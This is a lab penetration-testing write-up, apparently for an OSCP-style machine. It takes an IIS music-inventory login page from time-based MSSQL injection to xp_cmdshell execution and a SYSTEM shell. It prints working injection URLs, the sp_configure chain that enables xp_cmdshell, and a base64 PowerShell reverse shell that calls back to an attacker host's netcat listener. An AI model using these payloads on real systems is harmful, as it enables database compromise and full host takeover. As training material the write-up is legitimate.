# dj (10.11.1.128)
***
## Enumeration
1. Enumerate running services using `nmap`
```
nmap -sV -sC -Pn 10.11.1.128
```

2. `nmap` was able to detect several running services, but for this machine, the area of interest is the **Microsoft IIS** server running on port **4167** and the **Microsoft SQL Server (mssql)** server running on port **1433**
``` 
4167/tcp  open  http      syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
1433/tcp  open  ms-sql-s  syn-ack Microsoft SQL Server 2012 11.00.2100.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: DJ
|   NetBIOS_Domain_Name: DJ
|   NetBIOS_Computer_Name: DJ
|   DNS_Domain_Name: dj
|   DNS_Computer_Name: dj
|_  Product_Version: 6.3.9600
```

3. We performed directory enumeration on `http://10.11.1.128:4167/` and discovered a page called `Login.asp` which shows a login page for a music inventory app.
```
gobuster dir -u http://10.11.1.128:4167/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -o gobuster-4167.txt -x asp,aspx
```

![[dj-gobuster-login.png]]

![[dj-login-form.png]]

4. We checked the source code and finds out that the form submission is being handled by the endpoint `loginform.asp`. The form expects two parameters - `uname` and `psw`
![[dj-login-source.png]]

5. We've tested the form using several inputs and noticed that the application responsed with an `Internal server error` when the input contains a `'` (single quote) character on any of the parameters. This behavior indicates that it might be vulnerable to [`SQL Injection (SQLi)`](https://portswigger.net/web-security/sql-injection)
![[dj-internal-500.png]]

6. Since we are not getting any (descriptive) error message, we used time-based technique to confirm the SQLi vulnerability. 
![[dj-delay.png]]

Because of the injected query `WAITFOR DELAY '0:0:5'`, it took (around) **5000 milliseconds (or 5 seconds)** before we received the server response, thus, confirming that we can inject query into the parameter.

> [!info] 
> [WAITFOR DELAY](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql?redirectedfrom=MSDN&view=sql-server-ver16#b-using-waitfor-delay) is a T-SQL syntax specific for **MSSQL**. It suspends the execution of stored procedure for the specified amount of time.

***
## Exploitation

> [!info] 
> Since we already have a way to inject SQL queries, we can now try to elevate this **SQLi** into `Remote Command Exection (RCE)` for us to be able to execute OS commands and take control of the target.  

> [!important] 
> **MSSQL** offers a stored procedure called `xp_cmdshell` which allows execution of system commands. But for us to use `xp_cmdshell`, we need to enable it (as it was disabled by default). And for us to enable `xp_cmdshell`, we need to have a `sysadmin` privilege. Also we need to be able to stack queries. So it is important for us to check for this requirements first before we attempt to execute system commands.


1. First, we need to checked if we can stack queries. We will just add `;` (semi-colon) on our previously injected query
![[dj-stacked.png]]

The **5 seconds delay** on the server's response confirms that we are able to use stacked queries.

2. Then, we checked if we have a `sysadmin` privilege. We did this using the query `SELECT is_srvrolemember('sysadmin')`. If we have a `sysadmin` role, the result of this query is `1`, but since we do not have a way to see the results, we will going to use this with the `WAITFOR DELAY` function. The idea is that `IF result_of_query is 1, then we delay server's response` which translates into the query   
```sql
IF (SELECT+is_srvrolemember('sysadmin'))=1 WAITFOR DELAY '0:0:5'
```
   
   ![[dj-sysadmin.png]]
   
   The **5 seconds delay** on the server's response confirms that we have `sysadmin` role.

3. Since we are able to confirm that we can stack queries and we have `sysadmin` role, we have enabled `xp_cmdshell` using the following curl command.
```
curl -i -s -k -X $'GET' $'http://10.11.1.128:4167/loginform.asp?uname=a\'%3bEXEC+sp_configure+\'show+advanced+options\',+1%3bRECONFIGURE%3bEXEC+sp_configure+\'xp_cmdshell\',+1%3bRECONFIGURE%3b--'
```


> [!info] 
> We enabled **xp_cmdshell** using the following commands
> 
> `EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;`
> 
> Notice that it contains multiple commands. That's why it is important to make sure that we are able to use stacked queries

4. After we enabled `xp_cmdshell`, we've created the payload that will establish our reverse shell. We suggest using `PowerShell #3 (Base64)` from [Reverse Shell Generator](https://www.revshells.com/)
![[dj-revershell-generator.png]]

> [!info] 
> Although we are now be able to execute OS commands using `xp_cmdshell`, we still prefer a more stable shell (like a powershell) when controlling the target. 

5. Preparing a netcat listener on port **9001**
``` 
nc -lvnp 9001
```
6. We then executed our system command using the following curl command

```
curl -i -s -k -X $'GET' $'http://10.11.1.128:4167/loginform.asp?uname=a\';EXEC+xp_cmdshell+\'REPLACE_THIS\';--'
```

> [!note] 
> Make sure to replace  `REPLACE_THIS` with your own payload from [Reverse Shell Generator](https://www.revshells.com/). Also, make sure to replace any whitespace (from your payload) with `+`

> [!example] 
> ```
curl -i -s -k -X $'GET' $'http://10.11.1.128:4167/loginform.asp?uname=a\';EXEC+xp_cmdshell+\'powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA0ADUAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\';--'  

7. We are now able to catch a shell running as `nt authority\system`
   
   ![[dj-init-shell.png]]

***
## Post-exploitation
1. Since the shell we have is already running as `nt authority\system`, we will now be able to read the flag.   
![[dj-proof.png]]   